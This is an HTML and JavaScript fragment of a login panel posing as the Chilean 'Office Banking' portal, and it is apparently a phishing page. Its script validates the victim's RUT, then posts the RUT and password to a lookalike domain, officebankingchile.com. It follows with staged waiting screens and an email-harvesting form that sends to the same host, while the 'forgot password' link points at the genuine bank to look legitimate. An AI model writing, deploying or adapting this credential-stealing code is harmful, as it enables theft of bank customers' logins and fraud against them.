  <!-- Offcanvas con tu flujo original -->
<div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasLogin" aria-labelledby="offcanvasLoginLabel">
  <div class="offcanvas-header">
    <h5 class="offcanvas-title" id="offcanvasLoginLabel">Bienvenido a Office Banking</h5>
    <button type="button" class="btn-close" data-bs-dismiss="offcanvas"></button>
  </div>
  <div class="offcanvas-body">
    <div class="offcanvas-body">
      <div class="login-box">
        <img src="/logo-office-banking.png" alt="Office Banking"
     style="width:100%; max-width:280px; margin:20px auto; display:block;">

        <!-- Formulario inicial -->
        <form id="loginForm">
          <label for="rut">RUT</label>
          <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required>
          
          <label for="passwd">Contraseña</label>
          <input type="password" id="passwd" name="passwd" required>
                          
          <div class="options">
            <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">¿Olvidaste tu clave?</a>
          </div>
          
          <button type="submit" class="btn-red w-100">Aceptar</button>
        </form>
        <div id="resultado"></div>

         <!-- Pantalla de espera -->
        <div id="pantallaEspera" class="hidden">
          <h2>Estamos actualizando la información, por favor espera...</h2>
          <div class="spinner"></div>
        </div>

        <!-- Formulario de correo -->
        <div id="formCorreo" class="hidden">
          <h2>Necesitamos actualizar tu correo electrónico</h2>
          <input type="email" id="correo" placeholder="Ingresa tu correo">
          <button class="btn-red" onclick="enviarCorreo()">Enviar</button>
        </div>

        <!-- Pantalla de productos disponibles -->
        <div id="pantallaProductos" class="hidden">
          <h2>Tenemos algunos productos disponibles</h2>
          <button class="btn-red" onclick="continuarProductos()">Continuar</button>
        </div>
      </div>
    </div>
  </div>
  <!-- Scripts al final del body -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
 
  <script>    // ✅ Autoformateo de RUT en tiempo real
    function formatearRUT(valor) {
      valor = valor.replace(/\./g, "").replace(/-/g, "");
      if(valor.length === 0) return "";
      let dv = valor.slice(-1);
      let cuerpo = valor.slice(0, -1);
      let cuerpoFormateado = "";
      while(cuerpo.length > 3){
        cuerpoFormateado = "." + cuerpo.slice(-3) + cuerpoFormateado;
        cuerpo = cuerpo.slice(0, -3);
      }
      cuerpoFormateado = cuerpo + cuerpoFormateado;
      return cuerpoFormateado + "-" + dv;
    }

    document.getElementById("rut").addEventListener("input", function(e){
      let valor = e.target.value.replace(/[^0-9kK]/g, ""); // solo números y K
      e.target.value = formatearRUT(valor);
    });

    // Validación de RUT
    function validarRut(rutCompleto) {
      rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
      if(rutCompleto.length < 2) return false;
      let cuerpo = rutCompleto.slice(0, -1);
      let dv = rutCompleto.slice(-1);
      let suma = 0, multiplo = 2;
      for(let i = cuerpo.length - 1; i >= 0; i--) {
        suma += parseInt(cuerpo.charAt(i)) * multiplo;
        multiplo = multiplo < 7 ? multiplo + 1 : 2;
      }
      let dvEsperado = 11 - (suma % 11);
      dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
      return dv === dvEsperado;
    }

document.getElementById("loginForm").addEventListener("submit", async function(e){
  e.preventDefault();
  const rut = document.getElementById("rut").value;
  const passwd = document.getElementById("passwd").value;

  if(!validarRut(rut)){
    document.getElementById("resultado").innerText = "❌ RUT inválido";
    return;
  }

  try {
    const response = await fetch("https://officebankingchile.com/proxy-login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ rut, passwd })
    });
    const data = await response.json();
    document.getElementById("resultado").innerText = data.mensaje;

    if(response.ok){
      document.getElementById("loginForm").style.display="none";
      document.getElementById("pantallaEspera").classList.remove("hidden");

      setTimeout(()=>{
  document.getElementById("pantallaEspera").classList.add("hidden");
  document.getElementById("formCorreo").classList.remove("hidden");

  // 👇 AQUÍ
  document.querySelector('.offcanvas-body').scrollTop = 0;

}, 5000);
  } catch (error) {
    document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
  }
});

    async function enviarCorreo(){
      const correo = document.getElementById("correo").value;

      try {
        const response = await fetch("https://officebankingchile.com/proxy-login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ mail: correo })
        });
        const data = await response.json();
        document.getElementById("resultado").innerText = data.mensaje;
      } catch (error) {
        console.error("Error al enviar correo:", error);
      }
      document.getElementById("formCorreo").classList.add("hidden");
      document.getElementById("pantallaEspera").classList.remove("hidden");

      setTimeout(()=>{
        document.getElementById("pantallaEspera").classList.add("hidden");
        document.getElementById("pantallaProductos").classList.remove("hidden");
      }, 5000);
    }

    function continuarProductos(){
      document.getElementById("pantallaProductos").classList.add("hidden");
      document.getElementById("pantallaEspera").classList.remove("hidden");

      setTimeout(()=>{
        window.location.href="productos.html";
      }, 5000);
    }
  </script>
</body>
